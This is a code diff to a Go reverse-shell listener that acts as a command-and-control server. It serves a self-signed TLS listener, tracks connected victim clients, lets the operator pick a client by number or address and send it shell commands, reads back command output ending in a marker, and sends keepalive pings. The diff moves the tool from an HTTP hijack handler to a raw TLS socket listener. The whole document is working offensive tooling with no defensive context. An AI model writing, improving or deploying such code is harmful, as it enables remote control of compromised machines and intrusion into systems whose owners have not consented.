@@ -11,17 +11,11 @@ import (
 	"fmt"
 	"log"
 	"math/big"
-	"net/http"
+	"net"
 	"os"
 	"strings"
 	"sync"
 	"time"
-)
-
-var (
-	clientConnections = make(map[string]chan string)
-	clientResponses   = make(map[string]chan string)
-	mutex             sync.Mutex
 )
 
 // generateSelfSignedCert creates a self-signed TLS certificate on the fly
@@ -68,26 +62,17 @@ func generateSelfSignedCert() (tls.Certificate, error) {
 	return cert, nil
 }
 
+var (
+	clientConnections = make(map[string]chan string)
+	clientResponses   = make(map[string]chan string)
+	mutex             sync.Mutex
+)
+
 // reverseShellHandler handles incoming client connections
-func reverseShellHandler(w http.ResponseWriter, r *http.Request) {
-	clientAddr := r.RemoteAddr
+func reverseShellHandler(conn net.Conn) {
+	clientAddr := conn.RemoteAddr().String()
 	log.Printf("[+] New client connected: %s", clientAddr)
-
-	hijacker, ok := w.(http.Hijacker)
-	if !ok {
-		http.Error(w, "Hijacking not supported", http.StatusInternalServerError)
-		return
-	}
-
-	conn, bufrw, err := hijacker.Hijack()
-	if err != nil {
-		http.Error(w, err.Error(), http.StatusInternalServerError)
-		return
-	}
 	defer conn.Close()
-
-	fmt.Fprintf(bufrw, "HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\n\r\n")
-	bufrw.Flush()
 
 	cmdChan := make(chan string, 10)
 	respChan := make(chan string, 10)
@@ -107,16 +92,31 @@ func reverseShellHandler(w http.ResponseWriter, r *http.Request) {
 		log.Printf("[-] Client disconnected: %s", clientAddr)
 	}()
 
+	reader := bufio.NewReader(conn)
+	writer := bufio.NewWriter(conn)
+
+	// Read responses from client
 	go func() {
-		scanner := bufio.NewScanner(bufrw)
-		for scanner.Scan() {
-			response := scanner.Text()
-			respChan <- response
+		var responseBuffer strings.Builder
+		for {
+			line, err := reader.ReadString('\n')
+			if err != nil {
+				log.Printf("Error reading from client: %v", err)
+				return
+			}
+			
+			responseBuffer.WriteString(line)
+			
+			// Check if we've reached the end of output marker
+			if strings.Contains(line, "<<<END_OF_OUTPUT>>>") {
+				fullResponse := responseBuffer.String()
+				respChan <- fullResponse
+				responseBuffer.Reset()
+			}
 		}
 	}()
 
-	fmt.Fprintf(bufrw, "INFO\n")
-	bufrw.Flush()
+	// Wait for first client interaction instead of sending INFO automatically
 
 	for {
 		select {
@@ -124,15 +124,15 @@ func reverseShellHandler(w http.ResponseWriter, r *http.Request) {
 			if !ok {
 				return
 			}
-			fmt.Fprintf(bufrw, "%s\n", cmd)
-			bufrw.Flush()
+			fmt.Fprintf(writer, "%s\n", cmd)
+			writer.Flush()
 			
 			if cmd == "exit" {
 				return
 			}
 		case <-time.After(30 * time.Second):
-			fmt.Fprintf(bufrw, "PING\n")
-			bufrw.Flush()
+			fmt.Fprintf(writer, "PING\n")
+			writer.Flush()
 		}
 	}
 }
@@ -158,8 +158,8 @@ func interactiveShell() {
 
 		input, err := reader.ReadString('\n')
 		if err != nil {
-			log.Printf("Error reading input: %v", err)
-			continue
+			// EOF or other error - exit gracefully
+			return
 		}
 
 		input = strings.TrimSpace(input)
@@ -189,27 +189,40 @@ func interactiveShell() {
 
 			case "use":
 				if len(parts) < 2 {
-					fmt.Println("Usage: use <client_address>")
+					fmt.Println("Usage: use <client_id>")
 					continue
 				}
-				clientAddr := strings.Join(parts[1:], " ")
+				clientInput := parts[1]
 				mutex.Lock()
-				if _, exists := clientConnections[clientAddr]; exists {
-					currentClient = clientAddr
-					fmt.Printf("Now interacting with: %s\n", clientAddr)
-					fmt.Println("Type 'background' to return to listener prompt")
+				
+				var selectedAddr string
+				var numIdx int
+				if _, err := fmt.Sscanf(clientInput, "%d", &numIdx); err == nil {
+					// It's a number, find the corresponding client
+					var addrs []string
+					for addr := range clientConnections {
+						addrs = append(addrs, addr)
+					}
+					if numIdx > 0 && numIdx <= len(addrs) {
+						selectedAddr = addrs[numIdx-1]
+					}
 				} else {
-					fmt.Printf("Client not found: %s\n", clientAddr)
-					fmt.Println("Use 'list' to see connected clients")
+					// Treat as direct address
+					selectedAddr = clientInput
 				}
+				
+				if selectedAddr == "" || clientConnections[selectedAddr] == nil {
+					fmt.Printf("Client not found: %s\n", clientInput)
+					fmt.Println("Use 'list' to see connected clients")
+					mutex.Unlock()
+					continue
+				}
+				
+				currentClient = selectedAddr
+				fmt.Printf("Now interacting with: %s\n", selectedAddr)
+				fmt.Println("Type 'background' to return to listener prompt")
 				mutex.Unlock()
 
-			case "exit", "quit":
-				fmt.Println("Shutting down listener...")
-				os.Exit(0)
-
-			default:
-				fmt.Println("Unknown command. Available: list, use, exit")
 			}
 		} else {
 			if input == "background" || input == "bg" {
@@ -238,19 +251,11 @@ func interactiveShell() {
 
 			select {
 			case response := <-respChan:
-				fmt.Println(response)
-				for {
-					select {
-					case resp := <-respChan:
-						if resp == "<<<END_OF_OUTPUT>>>" {
-							goto nextCommand
-						}
-						fmt.Println(resp)
-					case <-time.After(100 * time.Millisecond):
-						goto nextCommand
-					}
+				// Response includes END_OF_OUTPUT marker, just print it
+				fmt.Print(response)
+				if !strings.HasSuffix(response, "\n") {
+					fmt.Println()
 				}
-			nextCommand:
 			case <-time.After(5 * time.Second):
 				fmt.Println("(command sent, no response received)")
 			}
@@ -258,7 +263,7 @@ func interactiveShell() {
 	}
 }
 
-func main() {
+func runListenerMain() {
 	if len(os.Args) != 3 {
 		fmt.Fprintf(os.Stderr, "Usage: %s <port> <network-interface>\n", os.Args[0])
 		fmt.Fprintf(os.Stderr, "Example: %s 8443 0.0.0.0\n", os.Args[0])
@@ -281,23 +286,22 @@ func main() {
 		MinVersion:   tls.VersionTLS12,
 	}
 
-	mux := http.NewServeMux()
-	mux.HandleFunc("/", reverseShellHandler)
-
-	server := &http.Server{
-		Addr:         address,
-		Handler:      mux,
-		TLSConfig:    tlsConfig,
-		ReadTimeout:  0,
-		WriteTimeout: 0,
-	}
-
-	log.Printf("Starting HTTPS listener on %s", address)
+	log.Printf("Starting TLS listener on %s", address)
 	
+	listener, err := tls.Listen("tcp", address, tlsConfig)
+	if err != nil {
+		log.Fatalf("Failed to create TLS listener: %v", err)
+	}
+	defer listener.Close()
+
 	go func() {
-		err := server.ListenAndServeTLS("", "")
-		if err != nil {
-			log.Fatalf("Server failed: %v", err)
+		for {
+			conn, err := listener.Accept()
+			if err != nil {
+				log.Printf("Error accepting connection: %v", err)
+				continue
+			}
+			go reverseShellHandler(conn)
 		}
 	}()
 
@@ -306,4 +310,8 @@ func main() {
 	log.Println("Listener ready. Waiting for connections...")
 
 	interactiveShell()
+}
+
+func main() {
+	runListenerMain()
 }
